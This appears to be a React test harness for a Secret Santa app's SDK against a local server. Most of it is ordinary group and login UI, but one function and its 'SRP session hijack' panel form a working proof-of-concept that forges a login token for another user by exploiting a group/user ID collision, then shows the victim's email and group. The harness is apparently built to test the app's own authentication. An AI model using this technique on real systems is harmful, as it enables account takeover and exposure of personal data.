import { useState } from "react";
import reactLogo from "./assets/react.svg";
import viteLogo from "/vite.svg";
import "./App.css";
import { SuperSantaAPI } from "super-santa-sdk";
import { GroupModel } from "super-santa-sdk/dist/api/dto/group";
import { User, UserSelf } from "super-santa-sdk/dist/api/dto/user";
import Markdown from "react-markdown";
import rehypeRaw from "rehype-raw";
import { ApiClient } from "super-santa-sdk/dist/api/client";
import { AuthContext } from "super-santa-sdk/dist/api/auth_context";
import {
  GetGroupChallengeResponse,
  LoginRequest,
  LoginResponse,
} from "super-santa-sdk/dist/api/dto/auth";
import { SRP } from "super-santa-sdk/dist/crypto/srp";
import { AES } from "super-santa-sdk/dist/crypto/aes";
import { CryptoUtils } from "super-santa-sdk/dist/crypto/utils";
import { jwtDecode } from "jwt-decode";

function App() {
  const [counter, setCounter] = useState(0);
  const [group, setGroup] = useState<GroupModel | null>(null);
  const [user, setUser] = useState<UserSelf | null>(null);
  const [resultUser, setResultUser] = useState<User | null>(null);
  const [wishesInput, setWishesInput] = useState<string>("");
  const [hijackGroupId, setHijackGroupId] = useState<string>("1");
  const [hijackSecretInput, setHijackSecretInput] =
    useState<string>("group-secret");
  const [loginGroupIdInput, setLoginGroupIdInput] = useState<string>("");
  const [hijackedUser, setHijackedUser] = useState<User | null>(null);
  const [hijackedGroup, setHijackedGroup] = useState<GroupModel | null>(null);

  const [groupNameInput, setGroupNameInput] = useState<string>("test-group");
  const [groupSecretInput, setGroupSecretInput] =
    useState<string>("group-secret");
  const [usernameInput, setUsernameInput] = useState<string>("user");
  const [emailInput, setEmailInput] = useState<string>("user@example.com");
  const [passwordInput, setPasswordInput] = useState<string>("password");

  const superSantaAPI = SuperSantaAPI.getInstance({
    apiHost: "http://localhost:8080",
  });

  async function auth() {
    const user = await superSantaAPI.auth();
    setUser(user);
    refreshGroup();
  }

  async function refreshGroup() {
    const group = await superSantaAPI.getGroup();
    setGroup(group);
    const resultUser = await superSantaAPI.parseResult(group);
    setResultUser(resultUser);
  }

  async function createGroup() {
    setUser(null);
    const { group, user } = await superSantaAPI.createGroup(
      groupNameInput,
      groupSecretInput,
      {
        username: usernameInput || "admin",
        email: emailInput || "catchall+ss-admin@onxzy.dev",
        password: passwordInput || "admin-password",
      }
    );
    console.log("Group created:", group);
    setUser(user);
    setGroup(group);
  }

  async function joinGroup() {
    logout();
    const groupId = loginGroupIdInput;
    if (!groupId) return;

    await superSantaAPI.loginGroup(groupId, groupSecretInput);

    const { user } = await superSantaAPI.joinGroup(
      usernameInput || "utilisateur" + counter,
      emailInput || `catchall+ss-user${counter}@onxzy.dev`,
      passwordInput || "user-password"
    );
    if (!user) return;
    setUser(user);
    const group = await superSantaAPI.getGroup();
    setGroup(group);
    console.log(user);
  }

  async function loginUser() {
    logout();
    const groupId = loginGroupIdInput;
    if (!groupId) return;

    await superSantaAPI.loginGroup(groupId, groupSecretInput);

    const user = await superSantaAPI.loginUser(
      emailInput || `catchall+ss-user${counter}@onxzy.dev`,
      passwordInput || "user-password"
    );
    if (!user) return;

    setUser(user);
    refreshGroup();

    console.log(user);
  }

  async function logout() {
    setGroup(null);
    setUser(null);
    superSantaAPI.logout();
  }

  async function draw() {
    await superSantaAPI.draw();
    refreshGroup();
  }

  async function updateWishes() {
    if (!user) return;
    await superSantaAPI.updateWishes(wishesInput);
    setUser(await superSantaAPI.getUser());
  }

  async function srpSessionHijack(id: number, secret: string) {
    const evilAuthContext = new AuthContext();
    const client = new ApiClient(
      "http://localhost:8080/api/v1",
      evilAuthContext
    );
    const cryptoUtils = new CryptoUtils();
    const aes = new AES(cryptoUtils);
    const srp = new SRP(aes);

    const challenge = await client.get<GetGroupChallengeResponse>(
      `/auth/group/${id}/challenge`
    );

    const solve = await srp.solveChallenge(
      challenge.group_challenge.server_pub_key,
      id as unknown as string,
      secret,
      challenge.group_challenge.salt
    );

    const { token } = await client.post<LoginRequest, LoginResponse>(
      `/auth/login`,
      {
        session_id: challenge.session_id,
        user_auth: {
          client_pub_key: solve.clientPublicEphemeral,
          client_auth: solve.clientSession.proof,
        },
      }
    );

    evilAuthContext.setAuthToken(token);

    console.log(jwtDecode(token));

    const user = await client.get<UserSelf>(`/auth/login`);
    setHijackedUser(user);

    const group = await client.get<GroupModel>(`/group`);
    setHijackedGroup(group);
  }

  return (
    <>
      <div className="card">
        <h2>User and Group Settings</h2>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: "10px",
            marginBottom: "15px",
          }}
        >
          <div>
            <h3>Group Settings</h3>
            <div style={{ marginBottom: "8px" }}>
              <label style={{ display: "block", marginBottom: "3px" }}>
                Group Name:
              </label>
              <input
                type="text"
                value={groupNameInput}
                onChange={(e) => setGroupNameInput(e.target.value)}
                placeholder="Group Name"
                style={{ padding: "5px", width: "100%" }}
              />
            </div>
            <div>
              <label style={{ display: "block", marginBottom: "3px" }}>
                Group Secret:
              </label>
              <input
                type="text"
                value={groupSecretInput}
                onChange={(e) => setGroupSecretInput(e.target.value)}
                placeholder="Group Secret"
                style={{ padding: "5px", width: "100%" }}
              />
            </div>
          </div>
          <div>
            <h3>User Settings</h3>
            <div style={{ marginBottom: "8px" }}>
              <label style={{ display: "block", marginBottom: "3px" }}>
                Username:
              </label>
              <input
                type="text"
                value={usernameInput}
                onChange={(e) => setUsernameInput(e.target.value)}
                placeholder="Username"
                style={{ padding: "5px", width: "100%" }}
              />
            </div>
            <div style={{ marginBottom: "8px" }}>
              <label style={{ display: "block", marginBottom: "3px" }}>
                Email:
              </label>
              <input
                type="text"
                value={emailInput}
                onChange={(e) => setEmailInput(e.target.value)}
                placeholder="Email"
                style={{ padding: "5px", width: "100%" }}
              />
            </div>
            <div>
              <label style={{ display: "block", marginBottom: "3px" }}>
                Password:
              </label>
              <input
                type="text"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                placeholder="Password"
                style={{ padding: "5px", width: "100%" }}
              />
            </div>
          </div>
        </div>

        <button onClick={() => createGroup()}>Create group</button>
        <div style={{ margin: "10px 0" }}>
          <input
            type="text"
            value={loginGroupIdInput}
            onChange={(e) => setLoginGroupIdInput(e.target.value)}
            placeholder="Enter Group ID for login"
            style={{ padding: "5px", marginRight: "10px" }}
          />
        </div>
        <button onClick={() => loginUser()}>Login</button>
        <button onClick={() => auth()}>Auth</button>
        <button onClick={() => logout()}>Logout</button>
        <button onClick={() => joinGroup()}>Join group</button>
        <button onClick={() => draw()}>Draw</button>
      </div>
      <div
        className="card"
        style={{
          marginBottom: "20px",
          backgroundColor: "#151515",
          padding: "15px",
          borderRadius: "6px",
        }}
      >
        <h2>Current Session</h2>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: "10px",
          }}
        >
          <div>
            <p>
              <strong>Group ID:</strong> {group ? group.id : "Not logged in"}
            </p>
            <p>
              <strong>Authentication:</strong>{" "}
              {user ? "Authenticated" : "Not authenticated"}
            </p>
            {user && (
              <p>
                <strong>Email:</strong> {user.email}
              </p>
            )}
          </div>
          <div>
            {group && group.results && (
              <div>
                <p>
                  <strong>Secret Santa Draw:</strong>{" "}
                  {group.results ? "Completed" : "Not drawn"}
                </p>
                <p>
                  <strong>Your giftee:</strong>{" "}
                  {resultUser ? resultUser.username : "Error parsing result"}
                </p>
              </div>
            )}
          </div>
        </div>
      </div>

      {group && (
        <div className="card">
          <h2>Group Users</h2>
          <div style={{ textAlign: "left", marginTop: "10px" }}>
            {group.users && group.users.length > 0 ? (
              <ul style={{ listStyleType: "none", padding: 0 }}>
                {group.users.map((user) => (
                  <li
                    key={user.id}
                    style={{
                      marginBottom: "5px",
                      padding: "8px",
                      backgroundColor: "#151515",
                      borderRadius: "4px",
                    }}
                  >
                    <strong>ID:</strong> {user.id} | <strong>Username:</strong>{" "}
                    {user.username}
                  </li>
                ))}
              </ul>
            ) : (
              <p>No users in this group</p>
            )}
          </div>
        </div>
      )}
      <hr />
      <div className="card">
        <h2>SRP session hijack</h2>
        <p>
          This is a test to hijack a session using the SRP protocol. You need to
          provide the group ID and the group secret.
          <br />
          To perform the attack you need to have the secret of a groupID
          matching the target userID
        </p>
        <div style={{ marginBottom: "10px" }}>
          <div style={{ display: "flex", marginBottom: "10px" }}>
            <input
              type="text"
              value={hijackGroupId}
              onChange={(e) => setHijackGroupId(e.target.value)}
              placeholder="Group ID"
              style={{ padding: "5px", marginRight: "10px", flex: "1" }}
            />
            <input
              type="text"
              value={hijackSecretInput}
              onChange={(e) => setHijackSecretInput(e.target.value)}
              placeholder="Group Secret"
              style={{ padding: "5px", flex: "1" }}
            />
          </div>
          <button
            onClick={() =>
              srpSessionHijack(parseInt(hijackGroupId), hijackSecretInput)
            }
          >
            Hijack session
          </button>
        </div>
        {hijackedUser && hijackedGroup && (
          <div
            style={{
              marginTop: "15px",
              padding: "10px",
              backgroundColor: "#151515",
              borderRadius: "4px",
              border: "1px solid #ff5555",
            }}
          >
            <h3 style={{ color: "#ff5555" }}>Hijacked User Information</h3>
            <p>
              <strong>Group ID:</strong> {hijackedGroup.id}
            </p>
            <p>
              <strong>User ID:</strong> {hijackedUser.id}
            </p>
            <p>
              <strong>Username:</strong> {hijackedUser.username}
            </p>
            <p>
              <strong>Email:</strong> {hijackedUser.email}
            </p>
          </div>
        )}
      </div>
      <p className="read-the-docs">
        Click on the Vite and React logos to learn more
      </p>
    </>
  );
}

export default App;
